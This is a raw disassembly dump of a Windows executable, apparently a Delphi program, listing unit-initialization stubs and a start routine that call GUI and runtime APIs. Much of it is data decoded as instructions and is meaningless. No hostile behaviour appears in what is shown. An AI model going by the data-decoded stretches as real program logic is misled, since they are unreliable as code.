add [ eax ] bh
0x4a
sub_4a613c
insb
mov cl 0x41
add [ edx + esi * 4 ] bl
inc ecx
add al cl
mov dl 0x41
add [ ebx + esi * 4 + 0x41 ] dh
add [ esp + esi * 4 ] ah
inc ecx
add ah dl
mov ah 0x41
add [ ebp + esi * 4 - 0x35c7ffbf ] al
dec edx
add [ eax ] bh
mov dh 0x41
add al ch
mov dh 0x41
add [ eax + 0x480041b7 ] bl
mov eax 0xb8f80041
inc ecx
add [ eax ] bh
0x4a
sub_4a7040
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax ] dh
adc [ eax ] al
dec esp
adc [ eax ] al
adc [ fs : eax ] al
adc [ eax ] 0x40
add [ eax + edx + 0x10b40040 ] bl
inc eax
add ah cl
adc [ eax ] al
in al 0x10
inc eax
add al bh
adc [ eax ] al
adc al 0x11
inc eax
add [ ecx + edx ] dh
inc eax
add [ eax ] bh
0x4a
sub_4a7090
cmp dl cl
dec edx
add [ eax - 0x63ffbfef ] cl
adc [ eax ] eax
cmp dl cl
dec edx
add [ eax - 0x37ffbfef ] dh
adc [ eax ] eax
cmp dl cl
dec edx
add al ah
adc [ eax ] eax
adc [ edx ] dl
inc eax
add [ eax + 0x12 ] al
inc eax
add [ eax + 0x12 ] dl
inc eax
add [ edx + edx + 0x40 ] ah
add [ eax + 0x12 ] bh
inc eax
add [ eax ] bh
0x4a
sub_4a70d0
cmp dl cl
dec edx
add [ eax - 0x63ffbfee ] cl
adc al [ eax ]
cmp dl cl
dec edx
add [ edx + edx + 0x13080040 ] dh
inc eax
add [ ebx + edx ] ah
inc eax
add [ ebx + edx + 0x13b00040 ] dl
inc eax
add [ eax ] al
adc al 0x40
add [ eax ] bh
0x4a
sub_4a75cc
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
sub [ edi ] dh
inc esp
add [ edi + esi + 0x44 ] bl
add [ eax ] al
cmp [ eax + eax + 0x60 ] al
cmp [ eax + eax - 0x20 ] al
inc esi
inc esp
add [ eax ] bh
0x4a
sub_4a7698
mov [ edi + 0x42 ] al
add [ eax + 0x20004248 ] al
dec ecx
inc edx
add [ eax + 0x50004249 ] bh
dec edx
inc edx
add al ch
dec edx
inc edx
add [ ebx + ecx * 2 + 0x42 ] bh
add [ eax ] bl
dec esp
inc edx
add [ eax ] bh
0x4a
sub_4a76bc
mov ah 0x4c
inc edx
add [ eax + 0x4d ] dl
inc edx
add al ch
dec ebp
inc edx
add [ esi + ecx * 2 + 0x42 ] bh
add [ eax ] bl
dec edi
inc edx
add [ eax + 0x3800424f ] bh
0x4a
sub_4a76d8
pop eax
push eax
inc edx
add ah bh
push eax
inc edx
add [ ecx + edx * 2 ] ch
inc edx
add [ ecx + edx * 2 + 0x42 ] dh
add [ ecx + edx * 2 + 0x51b40042 ] cl
inc edx
add ah dh
push ecx
inc edx
add [ eax ] bh
0x4a
sub_4a76f8
xor al 0x52
inc edx
add al cl
push ebx
inc edx
add [ eax ] ah
push esp
inc edx
add ah bl
pop edx
inc edx
add al bl
pop ebp
inc edx
add [ eax ] bh
0x4a
sub_4a7760
inc esp
jns r-xdata
0x9a2c0042 0x42
adc al 0x9b
inc edx
add [ ebx + ebx * 4 + 0x42 ] bl
add [ ecx + edi * 2 + 0x79b00042 ] dl
inc edx
add al bl
jns r-xdata
add [ ebx + ebx * 4 + 0x42 ] dh
add [ eax - 0x3ffbd65 ] bh
fwait
inc edx
add [ eax ] bh
0x4a
fwait
inc edx
add [ eax + 0x7f ] bh
inc edx
add [ esi + eax * 4 ] ch
inc edx
add [ eax ] bh
0x4a
sub_4a7790
cmp dl cl
dec edx
add [ ecx + edx * 4 ] bh
inc edx
add [ ecx + edx * 4 + 0x42 ] ch
add [ eax + 0x20004297 ] bl
cwde
inc edx
add [ eax ] al
0x9a2c0042 0x42
adc al 0x9b
inc edx
add [ ebx + ebx * 4 + 0x42 ] bl
add [ ebx + ebx * 4 + 0x42 ] dh
add [ eax - 0x3ffbd65 ] bh
fwait
inc edx
add [ eax ] bh
0x4a
sub_4a77d0
and al 0xa0
inc edx
add ah bl
mov al [ 0xffffffffa16c0042 ]
inc edx
add ah dl
mov eax [ 0xffffffffa2b80042 ]
inc edx
add [ ebx ] cl
inc edx
add [ eax + 0x4c0042a3 ] bl
movsb [ edi ] [ esi ]
inc edx
add [ eax ] al
movsd [ edi ] [ esi ]
inc edx
add al al
movsd [ edi ] [ esi ]
inc edx
add [ eax - 0x4f ] bh
inc edx
add al bl
mov bl 0x42
add ah al
mov ah 0x42
add [ eax ] bh
0x4a
sub_4a8188
cmp dl cl
dec edx
add al ah
inc esp
add [ eax + ebp * 2 + 0x68c40044 ] cl
inc esp
add ah dh
push 0x693c0044
inc esp
add [ eax + 0x69 ] dl
inc esp
add [ eax + 0x69 ] dh
inc esp
add al al
imul eax [ eax + eax - 0x28 ] 0xf0004469
imul eax [ eax + eax + 0xc ] 0xac00446a
push 0x44
add [ eax ] dh
imul eax [ eax + eax - 0x14 ] 0x6b
inc esp
add [ eax + 0x6c ] dl
inc esp
add al dl
insb
inc esp
add [ ebp + ebp * 2 + 0x44 ] cl
add [ ebp + ebp * 2 + 0x44 ] ah
add [ eax ] cl
outsd
inc esp
add [ eax + 0x3c00446f ] bl
jno r-xdata
add [ eax ] bh
0x4a
add [ esp + esi * 2 + 0x44 ] cl
add [ esi + esi * 2 + 0x44 ] al
add [ eax ] bh
0x4a
sub_4a81fc
inc esp
ja r-xdata
add [ esp + ebx * 4 ] bh
inc esp
add [ eax + 0x449c ] dh
popfd
inc esp
add [ eax - 0x5d ] bh
inc esp
add [ eax - 0x5a ] al
inc esp
add [ ebx + ebp * 4 ] ch
inc esp
add [ eax ] bh
0x4a
add [ edi + esi * 2 + 0x77c00044 ] ah
inc esp
add [ eax + edi * 2 ] cl
inc esp
add [ ecx + edi * 2 ] cl
inc esp
add [ esp + eax * 4 + 0x44 ] ah
add al bh
nop
inc esp
add ah ah
xchg ecx eax
inc esp
add [ eax ] dh
xchg edx eax
inc esp
add [ edi + edx * 4 - 0x35c7ffbc ] bl
dec edx
add [ eax ] bh
0x4a
sub_4a8238
cmp dl cl
dec edx
add ah dl
fwait
inc esp
add [ eax ] al
pushfd
inc esp
add [ esp + ebx * 4 ] bh
inc esp
add [ eax + 0x449c ] dh
popfd
inc esp
add [ eax - 0x5d ] bh
inc esp
add [ eax - 0x5a ] al
inc esp
add [ ebx + ebp * 4 ] ch
inc esp
add [ eax ] bh
0x4a
sub_4a950c
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax - 0x13ffb730 ] ch
ror [ eax ] 0x1
or al 0xd1
dec eax
add [ esp + edx * 8 + 0x48 ] cl
add ah ah
salc
dec eax
add [ eax + 0x7c0048da ] cl
fisttp [ eax ]
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9540
cmp dl cl
dec edx
add al ch
fisttp [ eax ]
sbb al 0xdc
dec eax
add [ esp + ebx * 8 + 0x48 ] cl
add [ eax - 0x3fffb724 ] dl
fmul [ eax ]
adc ch bl
dec eax
add [ eax - 0x23 ] ah
dec eax
add [ ebp + ebx * 8 + 0x48 ] bh
add [ esi + ebx * 8 ] bl
dec eax
add [ esi + ebx * 8 + 0x48 ] dh
add al al
fimul [ eax ]
adc bh bl
dec eax
add [ edi + ebx * 8 + 0x48 ] cl
add [ edi + ebx * 8 - 0x1fffffb8 ] dl
dec eax
add ah dl
loopne r-xdata
add [ eax ] bh
and [ ecx ] cl
nop
and [ ecx ] cl
les esp [ eax ]
dec ecx
add ah ch
loopne r-xdata
0x4a
add [ eax - 0x3bffb6e0 ] dl
and [ ecx ] cl
sub [ ecx ] ah
dec ecx
add [ ecx + 0x21d00049 ] cl
dec ecx
add [ eax ] dh
and cl [ ecx ]
les esp [ edx ]
dec ecx
add [ eax ] bl
and ecx [ ecx ]
mov [ esi ] dh
dec ecx
add [ eax ] bh
add [ eax - 0x1f ] dl
dec eax
add ah ah
loope r-xdata
add [ eax ] ch
and [ ecx ] ecx
mov [ ecx ] fs
dec ecx
add al dl
and [ ecx ] ecx
xor [ edx ] ah
dec ecx
add ah al
and cl [ ecx ]
sbb [ ebx ] ah
dec ecx
add [ eax + 0x38004936 ] cl
add [ esp ] bh
dec eax
add [ ebp + esi * 8 + 0x48 ] ah
add [ eax ] bh
0x4a
sub_4a95ac
clc
cmovns eax [ eax ]
insb
adc [ ecx ] ecx
add al 0x13
dec ecx
add [ ebx + edx ] bl
dec ecx
add [ eax + 0x13 ] dh
dec ecx
add [ eax + 0x4004919 ] al
and [ ecx ] cl
cmp dl cl
dec edx
add [ eax ] bh
and [ ecx ] cl
nop
and [ ecx ] cl
les esp [ eax ]
dec ecx
add [ eax ] ch
and [ ecx ] ecx
mov [ ecx ] fs
dec ecx
add al dl
and [ ecx ] ecx
xor [ edx ] ah
dec ecx
add ah al
and cl [ ecx ]
sbb [ ebx ] ah
dec ecx
add [ eax + 0x38004936 ] cl
0x4a
sub_4a9684
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ ecx + 0x10043 ] bh
add [ eax ] al
aam 0x1b
dec eax
add al ch
sbb al 0x48
add ah al
pop ds
dec eax
add [ eax ] bl
and [ eax ] cl
les esp [ eax ]
dec eax
add [ ecx + 0x24d40048 ] cl
dec eax
add [ esi ] dl
dec eax
add al bh
dec eax
add [ edi + 0x28d80048 ] dh
dec eax
add [ ecx + ebp + 0x48 ] cl
add [ edx + ebp + 0x2f080048 ] cl
dec eax
add [ eax + esi ] ch
dec eax
add [ ecx + esi + 0x32040048 ] bl
dec eax
add [ eax ] bl
dec eax
add [ esi + esi + 0x36f40048 ] bl
dec eax
add [ eax + 0x3a ] bh
dec eax
add [ eax + 0x6c00483b ] dh
dec eax
add ah ah
dec eax
add [ edi + edi + 0x487c0048 ] ah
dec eax
add [ eax - 0x3bffb7b8 ] ah
dec eax
dec eax
add [ eax + 0x59 ] ah
dec eax
add [ eax ] bh
0x4a
sub_4a970c
add [ eax ] eax
add [ eax ] al
mov al 0x27
inc esi
add al dl
daa
inc esi
add al ch
daa
inc esi
add [ eax ] bh
sub [ esi ] al
pushad
sub [ esi ] al
les ebp [ eax ]
inc esi
add al ch
sub [ esi ] al
mov [ ecx ] ch
inc esi
add [ eax - 0x33ffb9d7 ] dh
sub [ esi ] eax
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a97b8
cmp dl cl
dec edx
add [ eax + 0x8004631 ] ah
xor eax [ esi ]
adc al 0x34
inc esi
add [ eax ] dh
inc esi
add [ eax - 0x3bffb9c8 ] ch
cmp al [ esi ]
xor al 0x3c
inc esi
add [ eax ] bh
0x4a
sub_4a97e4
inc eax
aas
inc esi
add ah al
inc eax
inc esi
add al ah
inc eax
inc esi
add [ ecx + eax * 2 ] ah
inc esi
add [ eax - 0x2bffb9bf ] bl
inc ecx
inc esi
add [ eax ] ah
inc edx
inc esi
add [ eax + 0x42 ] bl
inc esi
add [ edx + eax * 2 + 0x46 ] dh
add [ eax ] bh
0x4a
sub_4a9814
fadd [ edx + 0x46 ]
add ah dh
inc edx
inc esi
add [ ebx + eax * 2 ] bh
inc esi
add [ ebx + eax * 2 + 0x46 ] dl
add [ esp + eax * 2 + 0x45c00046 ] bh
inc esi
add [ eax + ecx * 2 + 0x46 ] ah
add [ eax + 0x4b ] al
inc esi
add [ esp + ecx * 2 ] al
inc esi
add [ eax ] bh
0x4a
sub_4a983c
and [ esi + eax * 2 ] cl
cmp dl cl
dec edx
add al bl
dec esp
inc esi
add [ ebp + ecx * 2 + 0x46 ] dh
add [ ebp + ecx * 2 + 0x4e540046 ] dl
inc esi
add [ eax + 0x4e ] dh
inc esi
add [ eax ] bh
0x4a
sub_4a988c
test al 0x5d
inc esi
add al ah
pop edi
inc esi
add [ eax ] dl
popad
inc esi
add al dl
popad
inc esi
add [ edx + 0x46 ] ch
add [ eax + 0x10004663 ] dl
inc esi
add [ eax + 0x64 ] dh
inc esi
add [ eax + 0x65 ] dl
inc esi
add al ch
inc esi
add [ eax + 0x66 ] ah
inc esi
add al bh
inc si
add [ eax - 0x7fffb999 ] bl
push 0x69340046
inc esi
add [ eax - 0x63ffb997 ] dh
push 0x46
add [ ebx + ebp * 2 + 0x46 ] dl
add [ eax + 0x6c ] al
inc esi
add [ eax ] ah
insd
inc esi
add ah bl
insd
inc esi
add [ eax + 0x6e ] dh
inc esi
add al bl
test [ esi ] al
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9a08
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ edi + ebp * 4 - 0x35c7ffb8 ] ah
dec edx
add [ eax - 0x7ffb74f ] bl
mov cl 0x48
add [ eax - 0x4e ] ch
dec eax
add al bh
mov ch 0x48
add [ eax ] bh
0x4a
sub_4a9a44
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ ecx + ecx * 4 - 0x7633ffbb ] ah
inc ebp
add [ edx + ecx * 4 ] cl
inc ebp
add [ edx + ecx * 4 - 0x74afffbb ] bl
inc ebp
add [ esp + ecx * 4 ] cl
inc ebp
add al al
mov [ ebp ] es
or al 0x8d
inc ebp
add [ esi + ecx * 4 ] dh
inc ebp
add [ eax ] bh
0x4a
sub_4a9aa4
mov [ eax + 0x10045 ] dh
add [ eax ] al
in al 0x74
dec eax
add [ eax + 0x75 ] ah
dec eax
add [ ebp + esi * 2 + 0x75ec0048 ] dh
dec eax
add [ esi + esi * 2 ] ch
dec eax
add [ eax + 0x76 ] cl
dec eax
add ah al
jbe r-xdata
add [ eax ] bh
0x4a
add al ah
jbe r-xdata
add [ eax ] bh
0x4a
add ah bh
jbe r-xdata
add [ eax ] bh
0x4a
add [ eax + 0x1004887 ] dh
add [ eax ] al
add [ eax ] bh
0x4a
sub_4aa098
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
mov esp 0xe4004554
push esp
inc ebp
add [ eax ] dh
push ebp
inc ebp
add [ eax + 0x55 ] bh
inc ebp
add ah cl
push ebp
inc ebp
add al cl
pop ecx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4ab000
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40a6d4
call sub_403fe0
call sub_408c74
mov [ rw-data ] 0x2
mov [ rw-data ] sub_402458
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
call sub_40a278
mov [ rw-data ] eax
mov [ rw-data ] sub_4082a0
call sub_4054a4
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineW
mov [ rw-data ] eax
call sub_4025c0
mov [ rw-data ] eax
call GetACP
mov [ rw-data ] eax
mov [ rw-data ] 0x4b0
call sub_402598
mov [ rw-data ] eax
call sub_40a28c
sub_4ab0dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4ab15a
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4ab161
retn
mov eax r-xdata
call sub_406518
mov eax r-xdata
call sub_40655c
cmp [ rw-data ] 0x0
je r-xdata
call sub_417114
mov eax sub_418398
call sub_409b54
call sub_4171b4
call sub_4185b0
mov edx rw-data
xor eax eax
call sub_4094b0
call sub_417da0
mov eax rw-data
mov edx r-xdata
call sub_4070a8
sub_4ab188
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4ab229
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4ab230
retn
mov eax rw-data
call sub_4224a4
mov eax sub_41bf84
mov [ rw-data ] eax
mov eax sub_41bad4
mov [ rw-data ] eax
mov edx sub_41b9e4
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_41c29c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_421f60
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_41c5f0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_41fa88
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_42033c
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_4ab24c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4ab2d0
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4ab2d7
retn
mov eax sub_43d740
call sub_409b44
mov dl 0x1
mov eax [ r-xdata ]
call sub_41879c
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_409ccc
mov dl 0x1
mov eax [ r-xdata ]
call sub_42f128
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_430ee8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_430ee8
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_4ab354
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push j_sub_405fd0#2
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4ab7a6
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x4
call sub_407e40
retn
call sub_4045e4
mov [ rw-data ] 0x2f
mov [ rw-data ] 0x5c
mov [ rw-data ] 0x3b
mov [ rw-data ] 0x3a
mov [ rw-data ] 0x2e
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
push 0x24
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x6 ] 0x3
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x4
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x6
mov eax [ ebp - 0x4 ]
mov [ eax + 0xe ] 0x7
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x12 ] 0x9
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0xa
mov eax [ ebp - 0x4 ]
mov [ eax + 0x16 ] 0xb
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1a ] 0xd
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] 0xe
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e ] 0xf
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x10
mov eax [ ebp - 0x4 ]
mov [ eax + 0x22 ] 0x11
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x12
mov eax [ ebp - 0x4 ]
mov [ eax + 0x26 ] 0x13
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] 0x14
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2a ] 0x15
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x16
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2e ] 0x17
mov eax [ ebp - 0x4 ]
mov [ eax + 0x30 ] 0x18
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x19
mov eax [ ebp - 0x4 ]
mov [ eax + 0x34 ] 0x1a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x36 ] 0x1b
mov eax [ ebp - 0x4 ]
mov [ eax + 0x38 ] 0x1c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x3a ] 0x1d
mov eax [ ebp - 0x4 ]
mov [ eax + 0x3c ] 0x1e
mov eax [ ebp - 0x4 ]
mov [ eax + 0x3e ] 0x1f
mov eax [ ebp - 0x4 ]
mov [ eax + 0x40 ] 0x22
mov eax [ ebp - 0x4 ]
mov [ eax + 0x42 ] 0x3c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x44 ] 0x3e
mov eax [ ebp - 0x4 ]
mov [ eax + 0x46 ] 0x7c
mov edx [ ebp - 0x4 ]
mov eax rw-data
mov ecx [ r-xdata ]
call sub_408964
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_408928
push 0x29
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2 ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x2
mov eax [ ebp - 0x8 ]
mov [ eax + 0x6 ] 0x3
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] 0x4
mov eax [ ebp - 0x8 ]
mov [ eax + 0xa ] 0x5
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x6
mov eax [ ebp - 0x8 ]
mov [ eax + 0xe ] 0x7
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] 0x8
mov eax [ ebp - 0x8 ]
mov [ eax + 0x12 ] 0x9
mov eax [ ebp - 0x8 ]
mov [ eax + 0x14 ] 0xa
mov eax [ ebp - 0x8 ]
mov [ eax + 0x16 ] 0xb
mov eax [ ebp - 0x8 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1a ] 0xd
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] 0xe
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1e ] 0xf
mov eax [ ebp - 0x8 ]
mov [ eax + 0x20 ] 0x10
mov eax [ ebp - 0x8 ]
mov [ eax + 0x22 ] 0x11
mov eax [ ebp - 0x8 ]
mov [ eax + 0x24 ] 0x12
mov eax [ ebp - 0x8 ]
mov [ eax + 0x26 ] 0x13
mov eax [ ebp - 0x8 ]
mov [ eax + 0x28 ] 0x14
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2a ] 0x15
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2c ] 0x16
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2e ] 0x17
mov eax [ ebp - 0x8 ]
mov [ eax + 0x30 ] 0x18
mov eax [ ebp - 0x8 ]
mov [ eax + 0x32 ] 0x19
mov eax [ ebp - 0x8 ]
mov [ eax + 0x34 ] 0x1a
mov eax [ ebp - 0x8 ]
mov [ eax + 0x36 ] 0x1b
mov eax [ ebp - 0x8 ]
mov [ eax + 0x38 ] 0x1c
mov eax [ ebp - 0x8 ]
mov [ eax + 0x3a ] 0x1d
mov eax [ ebp - 0x8 ]
mov [ eax + 0x3c ] 0x1e
mov eax [ ebp - 0x8 ]
mov [ eax + 0x3e ] 0x1f
mov eax [ ebp - 0x8 ]
mov [ eax + 0x40 ] 0x22
mov eax [ ebp - 0x8 ]
mov [ eax + 0x42 ] 0x2a
mov eax [ ebp - 0x8 ]
mov [ eax + 0x44 ] 0x2f
mov eax [ ebp - 0x8 ]
mov [ eax + 0x46 ] 0x3a
mov eax [ ebp - 0x8 ]
mov [ eax + 0x48 ] 0x3c
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4a ] 0x3e
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4c ] 0x3f
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4e ] 0x5c
mov eax [ ebp - 0x8 ]
mov [ eax + 0x50 ] 0x7c
mov edx [ ebp - 0x8 ]
mov eax rw-data
mov ecx [ r-xdata ]
call sub_408964
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_408928
push 0x5
lea eax [ ebp - 0xc ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ ebp - 0xc ]
mov [ eax ] 0x2a
mov eax [ ebp - 0xc ]
mov [ eax + 0x2 ] 0x2f
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] 0x3a
mov eax [ ebp - 0xc ]
mov [ eax + 0x6 ] 0x3f
mov eax [ ebp - 0xc ]
mov [ eax + 0x8 ] 0x5c
mov edx [ ebp - 0xc ]
mov eax rw-data
mov ecx [ r-xdata ]
call sub_408964
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_408928
push 0x2
lea eax [ ebp - 0x10 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ ebp - 0x10 ]
mov [ eax ] 0x2a
mov eax [ ebp - 0x10 ]
mov [ eax + 0x2 ] 0x3f
mov edx [ ebp - 0x10 ]
mov eax rw-data
mov ecx [ r-xdata ]
call sub_408964
sub_4ab7c4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4533a0
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconW
mov [ rw-data ] eax
call sub_453448
mov cx 0x8c
mov dl 0x1
mov eax [ sub_44ab8c ]
call sub_44af48
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_44ab8c ]
call sub_44af48
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_44af48
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4538ac
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_430ee8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_430ee8
mov [ rw-data ] eax
mov ecx sub_44bb3c
mov edx sub_44bb4c
mov eax [ sub_446758 ]
call sub_42fcb0
mov ecx r-xdata
mov edx sub_44bec0
mov eax [ r-xdata ]
call sub_42fcb0
sub_4ab8c0
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40a7e8
xor edx edx
mov [ eax + 0x18 ] edx
call sub_40a7e8
xor edx edx
mov [ eax + 0x1c ] edx
call sub_40a7e8
xor edx edx
mov [ eax + 0x20 ] edx
call sub_40a7e8
xor edx edx
mov [ eax + 0x24 ] edx
call sub_40a7e8
xor edx edx
mov [ eax + 0x28 ] edx
call sub_40a7e8
xor edx edx
mov [ eax + 0x2c ] edx
call sub_40a7e8
xor edx edx
mov [ eax + 0x30 ] edx
call sub_40a7e8
xor edx edx
mov [ eax + 0x34 ] edx
call sub_40a7e8
xor edx edx
mov [ eax + 0x38 ] edx
xor eax eax
mov [ rw-data ] eax
sub_4aba58
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_40655c
call sub_458234
mov eax [ r-xdata ]
call sub_42f9e8
mov eax [ r-xdata ]
call sub_42fabc
mov edx [ r-xdata ]
mov eax [ sub_457a40 ]
call sub_42fa50
sub_4abaa8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_406518
mov eax [ r-xdata ]
call sub_42f9e8
mov eax [ r-xdata ]
call sub_42fabc
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_42fa50
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_42fa50
mov eax [ r-xdata ]
call sub_42f8f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4409d0
mov [ rw-data ] eax
sub_4abb30
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_405fd0
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4abbb6
retn
call GetVersion
cmp al 0x4
setae [ rw-data ]
call sub_47ff40
mov eax [ r-xdata ]
call sub_42f9e8
mov eax [ r-xdata ]
call sub_42fabc
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_42fa50
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_42fa50
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_42fa50
sub_4abbec
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4a27d4
call sub_40655c
call sub_4a2214
push r-xdata
call RegisterWindowMessageW
mov [ rw-data ] eax
mov eax sub_494454
call sub_42fe5c
xor eax eax
mov [ rw-data ] eax
_start
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov eax sub_4a5e64
call sub_40a834
mov ebx [ rw-data ]
mov eax [ ebx ]
call sub_4a0674
mov eax [ ebx ]
mov [ eax + 0x5b ] 0x0
mov eax [ ebx ]
mov dl 0x1
call sub_4a23b0
mov ecx [ rw-data ]
mov eax [ ebx ]
mov edx [ r-xdata ]
call sub_4a068c
mov ecx [ rw-data ]
mov eax [ ebx ]
mov edx [ r-xdata ]
call sub_4a068c
mov eax [ ebx ]
call sub_4a07dc
pop ebx
call sub_4066c8
sub_4014a0
mov esi 0x42004015
add ah dh
jmp edx
sub_4014b1
push ss
inc eax
add [ edx ] al
hlt
sub_4014d1
push ss
inc eax
add [ ebx ] al
hlt
sub_401c53
